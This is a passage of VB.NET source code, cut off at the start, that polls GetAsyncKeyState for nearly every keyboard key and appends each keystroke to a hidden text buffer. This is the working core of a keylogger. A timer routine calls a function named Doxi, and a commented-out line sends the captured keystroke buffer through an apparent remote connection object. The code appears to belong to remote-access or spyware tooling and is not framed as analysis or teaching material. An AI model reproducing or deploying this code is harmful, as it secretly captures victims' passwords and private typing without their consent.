        p1 = GetAsyncKeyState(Keys.P)
        If p1 Then
            Timer20.Enabled = False
            xtrem.Text += "P"

        End If
        Dim a1 As Boolean
        a1 = GetAsyncKeyState(Keys.A)
        If a1 Then
            Timer20.Enabled = False
            xtrem.Text += "A"

        End If
        Dim s1 As Boolean
        s1 = GetAsyncKeyState(Keys.S)
        If s1 Then
            Timer20.Enabled = False
            xtrem.Text += "S"

        End If
        Dim d1 As Boolean
        d1 = GetAsyncKeyState(Keys.D)
        If d1 Then
            Timer20.Enabled = False
            xtrem.Text += "D"

        End If
        Dim f1 As Boolean
        f1 = GetAsyncKeyState(Keys.F)
        If f1 Then
            Timer20.Enabled = False
            xtrem.Text += "F"

        End If
        Dim g1 As Boolean
        g1 = GetAsyncKeyState(Keys.G)
        If g1 Then
            Timer20.Enabled = False
            xtrem.Text += "G"

        End If
        Dim h1 As Boolean
        h1 = GetAsyncKeyState(Keys.H)
        If h1 Then
            Timer20.Enabled = False
            xtrem.Text += "H"

        End If
        Dim j1 As Boolean
        j1 = GetAsyncKeyState(Keys.J)
        If j1 Then
            Timer20.Enabled = False
            xtrem.Text += "J"

        End If
        Dim k1 As Boolean
        k1 = GetAsyncKeyState(Keys.K)
        If k1 Then
            Timer20.Enabled = False
            xtrem.Text += "K"

        End If
        Dim l1 As Boolean
        l1 = GetAsyncKeyState(Keys.L)
        If l1 Then
            Timer20.Enabled = False
            xtrem.Text += "L"

        End If
        Dim z1 As Boolean
        z1 = GetAsyncKeyState(Keys.Z)
        If z1 Then
            Timer20.Enabled = False
            xtrem.Text += "Z"

        End If
        Dim x1 As Boolean
        x1 = GetAsyncKeyState(Keys.X)
        If x1 Then
            Timer20.Enabled = False
            xtrem.Text += "X"

        End If
        Dim c1 As Boolean
        c1 = GetAsyncKeyState(Keys.C)
        If c1 Then
            Timer20.Enabled = False
            xtrem.Text += "C"

        End If
        Dim v1 As Boolean
        v1 = GetAsyncKeyState(Keys.V)
        If v1 Then
            Timer20.Enabled = False
            xtrem.Text += "V"

        End If
        Dim b1 As Boolean
        b1 = GetAsyncKeyState(Keys.B)
        If b1 Then
            Timer20.Enabled = False
            xtrem.Text += "B"

        End If
        Dim n1 As Boolean
        n1 = GetAsyncKeyState(Keys.N)
        If n1 Then
            Timer20.Enabled = False
            xtrem.Text += "N"

        End If
        Dim m1 As Boolean
        m1 = GetAsyncKeyState(Keys.M)
        If m1 Then
            Timer20.Enabled = False
            xtrem.Text += "M"

        End If
        Dim enter As Boolean
        enter = GetAsyncKeyState(Keys.Enter)
        If enter Then
            Timer20.Enabled = False
            xtrem.Text += vbNewLine  ' [ Enter ]

        End If
        Dim Space As Boolean
        Space = GetAsyncKeyState(Keys.Space)
        If Space Then
            Timer20.Enabled = False
            xtrem.Text += " " ' [ Space ]

        End If
        Dim xx1 As Boolean
        xx1 = GetAsyncKeyState(Keys.D1)
        If xx1 Then
            Timer20.Enabled = False
            xtrem.Text += "1" ' [ 1 ]

        End If
        Dim xx2 As Boolean
        xx2 = GetAsyncKeyState(Keys.D2)
        If xx2 Then
            Timer20.Enabled = False
            xtrem.Text += "2" ' [ 2 ]

        End If
        Dim xx3 As Boolean
        xx3 = GetAsyncKeyState(Keys.D3)
        If xx3 Then
            Timer20.Enabled = False
            xtrem.Text += "3" ' [ 3 ]

        End If
        Dim xx4 As Boolean
        xx4 = GetAsyncKeyState(Keys.D4)
        If xx4 Then
            Timer20.Enabled = False
            xtrem.Text += "4" ' [ 4 ]

        End If
        Dim xx5 As Boolean
        xx5 = GetAsyncKeyState(Keys.D5)
        If xx5 Then
            Timer20.Enabled = False
            xtrem.Text += "5" ' [ 5 ]

        End If
        Dim xx6 As Boolean
        xx6 = GetAsyncKeyState(Keys.D6)
        If xx6 Then
            Timer20.Enabled = False
            xtrem.Text += "6" ' [ 6 ]

        End If
        Dim xx7 As Boolean
        xx7 = GetAsyncKeyState(Keys.D7)
        If xx7 Then
            Timer20.Enabled = False
            xtrem.Text += "7" ' [ 7 ]

        End If
        Dim xx8 As Boolean
        xx8 = GetAsyncKeyState(Keys.D8)
        If xx8 Then
            Timer20.Enabled = False
            xtrem.Text += "8" ' [ 8 ]

        End If
        Dim xx9 As Boolean
        xx9 = GetAsyncKeyState(Keys.D9)
        If xx9 Then
            Timer20.Enabled = False
            xtrem.Text += "9" ' [ 9 ]

        End If
        Dim xx0 As Boolean
        xx0 = GetAsyncKeyState(Keys.D0)
        If xx0 Then
            Timer20.Enabled = False
            xtrem.Text += "0" ' [ 0 ]

        End If
        Dim CAPS As Boolean
        CAPS = GetAsyncKeyState(Keys.CapsLock)
        If CAPS Then
            Timer20.Enabled = False
            xtrem.Text += "( capslock )" ' [ CapsLock ]

        End If
        Dim ShiftKey As Boolean
        ShiftKey = GetAsyncKeyState(Keys.ShiftKey)
        If ShiftKey Then
            Timer20.Enabled = False
            xtrem.Text += "( shift )" ' [ ShiftKey ]

        End If
        Dim Oem1 As Boolean
        Oem1 = GetAsyncKeyState(Keys.Oem1)
        If Oem1 Then
            Timer20.Enabled = False
            xtrem.Text += ";" ' [ ; ]

        End If
        Dim Oem2 As Boolean
        Oem2 = GetAsyncKeyState(Keys.Oem2)
        If Oem2 Then
            Timer20.Enabled = False
            xtrem.Text += "/" ' [ / ]

        End If
        Dim Oem3 As Boolean
        Oem3 = GetAsyncKeyState(Keys.Oem3)
        If Oem3 Then
            Timer20.Enabled = False
            xtrem.Text += "`" ' [ ` ]

        End If
        Dim Oem4 As Boolean
        Oem4 = GetAsyncKeyState(Keys.Oem4)
        If Oem4 Then
            Timer20.Enabled = False
            xtrem.Text += "[" ' [ [ ]

        End If
        Dim Oem5 As Boolean
        Oem5 = GetAsyncKeyState(Keys.Oem5)
        If Oem5 Then
            Timer20.Enabled = False
            xtrem.Text += "\" ' [ \ ]

        End If
        Dim Oem6 As Boolean
        Oem6 = GetAsyncKeyState(Keys.Oem6)
        If Oem6 Then
            Timer20.Enabled = False
            xtrem.Text += "]" ' [ ] ]

        End If
        Dim Oem7 As Boolean
        Oem7 = GetAsyncKeyState(Keys.Oem7)
        If Oem7 Then
            Timer20.Enabled = False
            xtrem.Text += "'" ' [ ' ]

        End If
        Dim Oemplus As Boolean
        Oemplus = GetAsyncKeyState(Keys.Oemplus)
        If Oemplus Then
            Timer20.Enabled = False
            xtrem.Text += "=" ' [ = ]

        End If
        Dim OemPeriod As Boolean
        OemPeriod = GetAsyncKeyState(Keys.OemPeriod)
        If OemPeriod Then
            Timer20.Enabled = False
            xtrem.Text += "." ' [ . ]

        End If
        Dim Oemcomma As Boolean
        Oemcomma = GetAsyncKeyState(Keys.Oemcomma)
        If Oemcomma Then
            Timer20.Enabled = False
            xtrem.Text += "," ' [ , ]

        End If
        Dim OemMinus As Boolean
        OemMinus = GetAsyncKeyState(Keys.OemMinus)
        If OemMinus Then
            Timer20.Enabled = False
            xtrem.Text += "-" ' [ - ]

        End If
        Dim Back As Boolean
        Back = GetAsyncKeyState(Keys.Back)
        If Back Then
            Timer20.Enabled = False
            xtrem.Text += "( back )" ' [ Back ]

        End If
        Dim PrintScreen As Boolean
        PrintScreen = GetAsyncKeyState(Keys.PrintScreen)
        If PrintScreen Then
            Timer20.Enabled = False
            xtrem.Text += "( printscreen )" ' [ PrintScreen ]

        End If
        Dim Left As Boolean
        Left = GetAsyncKeyState(Keys.Left)
        If Left Then
            Timer20.Enabled = False
            xtrem.Text += "( left )" ' [ Left ]

        End If
        Dim Right As Boolean
        Right = GetAsyncKeyState(Keys.Right)
        If Right Then
            Timer20.Enabled = False
            xtrem.Text += "( right )" ' [ Right ]

        End If
        Dim Down As Boolean
        Down = GetAsyncKeyState(Keys.Down)
        If Down Then
            Timer20.Enabled = False
            xtrem.Text += "( down )" ' [ Down ]

        End If
        Dim Delete As Boolean
        Delete = GetAsyncKeyState(Keys.Delete)
        If Delete Then
            Timer20.Enabled = False
            xtrem.Text += "( delete )" ' [ Delete ]

        End If
        Dim Up As Boolean
        Up = GetAsyncKeyState(Keys.Up)
        If Up Then
            Timer20.Enabled = False
            xtrem.Text += "( up )" ' [ Up ]

        End If
        Dim oo0 As Boolean
        oo0 = GetAsyncKeyState(Keys.NumPad0)
        If oo0 Then
            Timer20.Enabled = False
            xtrem.Text += "0"

        End If
        Dim oo1 As Boolean
        oo1 = GetAsyncKeyState(Keys.NumPad1)
        If oo1 Then
            Timer20.Enabled = False
            xtrem.Text += "1"

        End If
        Dim oo2 As Boolean
        oo2 = GetAsyncKeyState(Keys.NumPad2)
        If oo2 Then
            Timer20.Enabled = False
            xtrem.Text += "2"

        End If
        Dim oo3 As Boolean
        oo3 = GetAsyncKeyState(Keys.NumPad3)
        If oo3 Then
            Timer20.Enabled = False
            xtrem.Text += "3"

        End If
        Dim oo4 As Boolean
        oo4 = GetAsyncKeyState(Keys.NumPad4)
        If oo4 Then
            Timer20.Enabled = False
            xtrem.Text += "4"

        End If
        Dim oo5 As Boolean
        oo5 = GetAsyncKeyState(Keys.NumPad5)
        If oo5 Then
            Timer20.Enabled = False
            xtrem.Text += "5"

        End If
        Dim oo6 As Boolean
        oo6 = GetAsyncKeyState(Keys.NumPad6)
        If oo6 Then
            Timer20.Enabled = False
            xtrem.Text += "6"

        End If
        Dim oo7 As Boolean
        oo7 = GetAsyncKeyState(Keys.NumPad7)
        If oo7 Then
            Timer20.Enabled = False
            xtrem.Text += "7"

        End If
        Dim oo8 As Boolean
        oo8 = GetAsyncKeyState(Keys.NumPad8)
        If oo8 Then
            Timer20.Enabled = False
            xtrem.Text += "8"

        End If
        Dim oo9 As Boolean
        oo9 = GetAsyncKeyState(Keys.NumPad9)
        If oo9 Then
            Timer20.Enabled = False
            xtrem.Text += "9"

        End If
        Dim ff1 As Boolean
        ff1 = GetAsyncKeyState(Keys.F1)
        If ff1 Then
            Timer20.Enabled = False
            xtrem.Text += "( f1 )"

        End If
        Dim ff2 As Boolean
        ff2 = GetAsyncKeyState(Keys.F2)
        If ff2 Then
            Timer20.Enabled = False
            xtrem.Text += "( f2 )"

        End If
        Dim ff3 As Boolean
        ff3 = GetAsyncKeyState(Keys.F3)
        If ff3 Then
            Timer20.Enabled = False
            xtrem.Text += "( f3 )"

        End If
        Dim ff4 As Boolean
        ff4 = GetAsyncKeyState(Keys.F4)
        If ff4 Then
            Timer20.Enabled = False
            xtrem.Text += "( f4 )"

        End If
        Dim ff5 As Boolean
        ff5 = GetAsyncKeyState(Keys.F5)
        If ff5 Then
            Timer20.Enabled = False
            xtrem.Text += "( f5 )"

        End If
        Dim ff6 As Boolean
        ff6 = GetAsyncKeyState(Keys.F6)
        If ff6 Then
            Timer20.Enabled = False
            xtrem.Text += "( f6 )"

        End If
        Dim ff7 As Boolean
        ff7 = GetAsyncKeyState(Keys.F7)
        If ff7 Then
            Timer20.Enabled = False
            xtrem.Text += "( f6 )"

        End If
        Dim ff8 As Boolean
        ff8 = GetAsyncKeyState(Keys.F8)
        If ff8 Then
            Timer20.Enabled = False
            xtrem.Text += "( f8 )"

        End If
        Dim ff9 As Boolean
        ff9 = GetAsyncKeyState(Keys.F9)
        If ff9 Then
            Timer20.Enabled = False
            xtrem.Text += "( f9 )"

        End If
        Dim ff10 As Boolean
        ff10 = GetAsyncKeyState(Keys.F10)
        If ff10 Then
            Timer20.Enabled = False
            xtrem.Text += "( f10 )"

        End If
        Dim ff11 As Boolean
        ff11 = GetAsyncKeyState(Keys.F11)
        If ff11 Then
            Timer20.Enabled = False
            xtrem.Text += "( f11 )"

        End If
        Dim ff12 As Boolean
        ff12 = GetAsyncKeyState(Keys.F12)
        If ff12 Then
            Timer20.Enabled = False
            xtrem.Text += "( f12 )"

        End If
        Dim Escape As Boolean
        Escape = GetAsyncKeyState(Keys.Escape)
        If Escape Then
            Timer20.Enabled = False
            xtrem.Text += "( escape )"

        End If
        Dim Tab As Boolean
        Tab = GetAsyncKeyState(Keys.Tab)
        If Tab Then
            Timer20.Enabled = False
            xtrem.Text += "( tab )"

        End If
        Timer20.Enabled = True
    End Sub

    Private Sub Timer20_Tick(sender As Object, e As EventArgs) Handles Timer20.Tick
        On Error Resume Next
        Dim sglCPU As Single = PfcCPU.NextValue() / 100
        Screamhi = sglCPU.ToString("p")
        If ero = 2 Then

            Doxi()
            'Comet.Send("xox" & Yy & xtrem.Text)

        End If

    End Sub
End Class
